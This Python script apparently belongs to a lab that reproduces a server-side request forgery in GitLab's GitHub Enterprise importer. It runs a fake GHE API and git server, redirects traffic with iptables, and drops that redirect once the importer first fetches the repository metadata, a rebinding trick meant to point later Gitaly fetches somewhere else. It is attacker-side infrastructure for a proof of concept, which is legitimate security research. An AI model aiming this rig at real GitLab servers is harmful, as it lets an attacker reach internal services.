#!/usr/bin/env python3
"""Fake GHE API + git-http-backend on :18080 inside the GitLab netns."""


import json
import os
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

WITNESS = os.environ.get("WITNESS", "GITLAB-GITALY-FETCH-SSRF-WITNESS")
GIT_ROOT = os.environ.get("GIT_ROOT", "/git")
SHARED_DIR = os.environ.get("SHARED_DIR", "/shared")
LOG_DIR = os.environ.get("LOG_DIR", "/logs")
BIND_HOST = os.environ.get("BIND_HOST", "0.0.0.0")
BIND_PORT = int(os.environ.get("BIND_PORT", "18080"))
PUBLIC_IP = os.environ.get("PUBLIC_IP", "1.1.1.1")
GHE_NAME = os.environ.get("GHE_NAME", "ghe.lab")
FLIP_PATH = os.path.join(SHARED_DIR, "rebind_flip")
LOG_PATH = os.path.join(LOG_DIR, "catcher.log")
BARE = os.path.join(GIT_ROOT, "org", "repo.git")
CLONE_URL = f"http://{GHE_NAME}:{BIND_PORT}/org/repo.git"
API_BASE = f"http://{GHE_NAME}:{BIND_PORT}/api/v3"

_lock = threading.Lock()
_repo_exact_gets = 0
_rebind_armed = False


def log(msg: str) -> None:
    line = f"{time.strftime('%Y-%m-%dT%H:%M:%S')} {msg}"
    print(line, flush=True)
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(LOG_PATH, "a", encoding="utf-8") as fh:
        fh.write(line + "\n")


def seed_repo() -> None:
    os.makedirs(os.path.join(GIT_ROOT, "org"), exist_ok=True)
    if os.path.isdir(BARE):
        log(f"git-seed exists {BARE}")
        return
    seed = "/tmp/seed-repo"
    os.makedirs(seed, exist_ok=True)
    env = os.environ.copy()
    env["HOME"] = "/tmp"
    cmds = [
        ["git", "init", seed],
        ["git", "-C", seed, "config", "user.email", "lab@localhost.invalid"],
        ["git", "-C", seed, "config", "user.name", "Lab"],
    ]
    for cmd in cmds:
        subprocess.run(cmd, check=True, env=env, capture_output=True)
    with open(os.path.join(seed, "WITNESS"), "w", encoding="utf-8") as fh:
        fh.write(WITNESS + "\n")
    subprocess.run(["git", "-C", seed, "add", "WITNESS"], check=True, env=env, capture_output=True)
    subprocess.run(["git", "-C", seed, "commit", "-m", "witness"], check=True, env=env, capture_output=True)
    subprocess.run(["git", "-C", seed, "branch", "-M", "master"], check=True, env=env, capture_output=True)
    subprocess.run(["git", "clone", "--bare", seed, BARE], check=True, env=env, capture_output=True)
    subprocess.run(["git", "--git-dir", BARE, "update-server-info"], check=True, env=env, capture_output=True)
    log(f"git-seeded {BARE} witness={WITNESS}")


def iptables_redirect(add: bool) -> None:
    args = [
        "iptables",
        "-t",
        "nat",
        "-A" if add else "-D",
        "OUTPUT",
        "-p",
        "tcp",
        "-d",
        PUBLIC_IP,
        "--dport",
        str(BIND_PORT),
        "-j",
        "REDIRECT",
        "--to-ports",
        str(BIND_PORT),
    ]
    proc = subprocess.run(args, capture_output=True, text=True)
    log(f"iptables {'add' if add else 'del'} rc={proc.returncode} err={(proc.stderr or '').strip()[:200]}")


def arm_rebind(reason: str) -> None:
    global _rebind_armed
    with _lock:
        if _rebind_armed:
            return
        _rebind_armed = True
        os.makedirs(SHARED_DIR, exist_ok=True)
        with open(FLIP_PATH, "w", encoding="utf-8") as fh:
            fh.write(reason + "\n")
        iptables_redirect(False)
        log(f"IOC rebind-armed reason={reason}")


def repo_payload() -> dict:
    owner = {"login": "org", "id": 7, "type": "Organization", "site_admin": False}
    return {
        "id": 4242,
        "name": "repo",
        "full_name": "org/repo",
        "private": False,
        "html_url": f"http://{GHE_NAME}:{BIND_PORT}/org/repo",
        "description": "gitaly fetch ssrf lab",
        "fork": False,
        "url": f"{API_BASE}/repos/org/repo",
        "clone_url": CLONE_URL,
        "git_url": f"git://{GHE_NAME}:{BIND_PORT}/org/repo.git",
        "ssh_url": f"git@{GHE_NAME}:org/repo.git",
        "svn_url": CLONE_URL,
        "default_branch": "master",
        "master_branch": "master",
        "has_issues": False,
        "has_wiki": False,
        "has_pages": False,
        "has_downloads": False,
        "archived": False,
        "disabled": False,
        "size": 1,
        "stargazers_count": 0,
        "watchers_count": 0,
        "language": None,
        "forks_count": 0,
        "open_issues_count": 0,
        "owner": owner,
        "organization": owner,
        "permissions": {"admin": True, "push": True, "pull": True},
    }


def user_payload() -> dict:
    return {"login": "lab", "id": 1, "type": "User", "site_admin": False}


def rate_payload() -> dict:
    reset = int(time.time()) + 3600
    return {
        "resources": {
            "core": {"limit": 5000, "remaining": 4999, "reset": reset},
            "search": {"limit": 30, "remaining": 29, "reset": reset},
            "graphql": {"limit": 5000, "remaining": 4999, "reset": reset},
        },
        "rate": {"limit": 5000, "remaining": 4999, "reset": reset},
    }


def parse_cgi(output: bytes) -> tuple[int, list[tuple[str, str]], bytes]:
    sep = b"\r\n\r\n" if b"\r\n\r\n" in output else b"\n\n"
    header_blob, _, body = output.partition(sep)
    status = 200
    headers: list[tuple[str, str]] = []
    for raw in header_blob.decode("latin1", "replace").splitlines():
        if ":" not in raw:
            continue
        key, val = raw.split(":", 1)
        key, val = key.strip(), val.strip()
        if key.lower() == "status":
            try:
                status = int(val.split()[0])
            except ValueError:
                status = 200
        else:
            headers.append((key, val))
    return status, headers, body


def git_backend(method: str, path: str, query: str, headers, body: bytes) -> tuple[int, list[tuple[str, str]], bytes]:
    env = os.environ.copy()
    env.update(
        {
            "GIT_PROJECT_ROOT": GIT_ROOT,
            "GIT_HTTP_EXPORT_ALL": "1",
            "REQUEST_METHOD": method,
            "PATH_INFO": path,
            "QUERY_STRING": query,
            "REMOTE_USER": "git",
            "REMOTE_ADDR": "127.0.0.1",
            "CONTENT_TYPE": headers.get("Content-Type", "application/x-git-upload-pack-request"),
            "CONTENT_LENGTH": str(len(body)),
            "HOME": "/tmp",
            "GIT_PROTOCOL": headers.get("Git-Protocol", ""),
        }
    )
    proc = subprocess.run(
        ["git", "http-backend"],
        input=body,
        capture_output=True,
        env=env,
        check=False,
    )
    if proc.returncode != 0:
        err = (proc.stderr or b"").decode("utf-8", "replace")[:400]
        log(f"git-http-backend rc={proc.returncode} err={err}")
        return 500, [("Content-Type", "text/plain")], b"git-http-backend failed\n"
    if proc.stderr:
        log(f"git-http-backend-stderr {proc.stderr.decode('utf-8', 'replace')[:300]}")
    return parse_cgi(proc.stdout)


def normalize_api_path(path: str) -> str:
    if path.startswith("/api/v3"):
        return path[len("/api/v3") :] or "/"
    return path


def is_git_path(path: str) -> bool:
    return "/org/repo.git" in path or path.endswith(".git") or "/git-upload-pack" in path or path.endswith("/info/refs")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt: str, *args) -> None:
        return

    def _read_body(self) -> bytes:
        length = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(length) if length else b""

    def _send(self, status: int, headers: list[tuple[str, str]], body: bytes) -> None:
        if self.command == "HEAD":
            body = b""
        self.send_response(status)
        have_len = False
        for key, val in headers:
            if key.lower() == "status":
                continue
            if key.lower() == "content-length":
                have_len = True
            self.send_header(key, val)
        if not have_len:
            self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def _json(self, payload, status: int = 200) -> None:
        raw = json.dumps(payload).encode("utf-8")
        headers = [
            ("Content-Type", "application/json"),
            ("X-RateLimit-Limit", "5000"),
            ("X-RateLimit-Remaining", "4999"),
            ("X-RateLimit-Reset", str(int(time.time()) + 3600)),
            ("X-GitHub-Media-Type", "github.v3; format=json"),
        ]
        self._send(status, headers, raw)

    def _handle(self) -> None:
        parsed = urlparse(self.path)
        path = parsed.path
        ua = self.headers.get("User-Agent", "")
        host = self.headers.get("Host", "")
        client = self.client_address[0] if self.client_address else "?"
        dest = self.headers.get("X-Forwarded-For", "")
        log(
            f"{self.command} {path} host={host} ua={ua!r} client={client} dest={dest} "
            f"flip={int(os.path.exists(FLIP_PATH))}"
        )
        if is_git_path(path) and not path.startswith("/api/"):
            body = self._read_body()
            if "git-upload-pack" in path or "info/refs" in path:
                log(f"IOC git-http path={path} ua={ua!r} host={host} client={client}")
            status, headers, out = git_backend(self.command, path, parsed.query, self.headers, body)
            self._send(status, headers, out)
            return

        api = normalize_api_path(path).rstrip("/") or "/"
        if self.command == "POST" and api.endswith("git-upload-pack"):
            body = self._read_body()
            status, headers, out = git_backend(self.command, path, parsed.query, self.headers, body)
            self._send(status, headers, out)
            return

        self._read_body()
        if api in ("/user", "/users/lab"):
            self._json(user_payload())
            return
        if api == "/rate_limit":
            self._json(rate_payload())
            return
        if api in ("/repositories/4242", "/repos/org/repo"):
            self._json(repo_payload())
            if api == "/repos/org/repo":
                global _repo_exact_gets
                with _lock:
                    _repo_exact_gets += 1
                    n = _repo_exact_gets
                log(f"IOC github-repo-get n={n}")
                if n >= 1:
                    # Worker RepositoryImporter#client_repository is the first
                    # GET /repos/org/repo (initial POST uses /repositories/:id).
                    arm_rebind(f"repos-org-repo-get-{n}")
            return
        if api.startswith("/repos/org/repo/"):
            rest = api[len("/repos/org/repo/") :]
            if rest == "branches":
                self._json(
                    [
                        {
                            "name": "master",
                            "commit": {"sha": "0" * 40, "url": f"{API_BASE}/repos/org/repo/commits/master"},
                            "protected": False,
                        }
                    ]
                )
                return
            if rest.startswith("git/"):
                self._json([])
                return
            self._json([])
            return
        if api.startswith("/repos/") or api.startswith("/repositories/"):
            self._json([])
            return
        if api == "/":
            self._json({"ok": True, "witness": WITNESS})
            return
        self._json([])

    def do_GET(self) -> None:
        try:
            self._handle()
        except Exception as exc:  # noqa: BLE001
            log(f"handler-error GET {exc}")
            try:
                self._send(500, [("Content-Type", "text/plain")], b"error\n")
            except Exception:
                pass

    def do_POST(self) -> None:
        try:
            self._handle()
        except Exception as exc:  # noqa: BLE001
            log(f"handler-error POST {exc}")
            try:
                self._send(500, [("Content-Type", "text/plain")], b"error\n")
            except Exception:
                pass

    def do_HEAD(self) -> None:
        self.do_GET()

    def do_PATCH(self) -> None:
        self._read_body()
        self._json([])


def main() -> None:
    os.makedirs(SHARED_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)
    if os.path.exists(FLIP_PATH):
        os.remove(FLIP_PATH)
    seed_repo()
    iptables_redirect(True)
    log(f"catcher-listen {BIND_HOST}:{BIND_PORT} clone={CLONE_URL}")
    httpd = ThreadingHTTPServer((BIND_HOST, BIND_PORT), Handler)
    httpd.allow_reuse_address = True
    httpd.serve_forever()


if __name__ == "__main__":
    main()
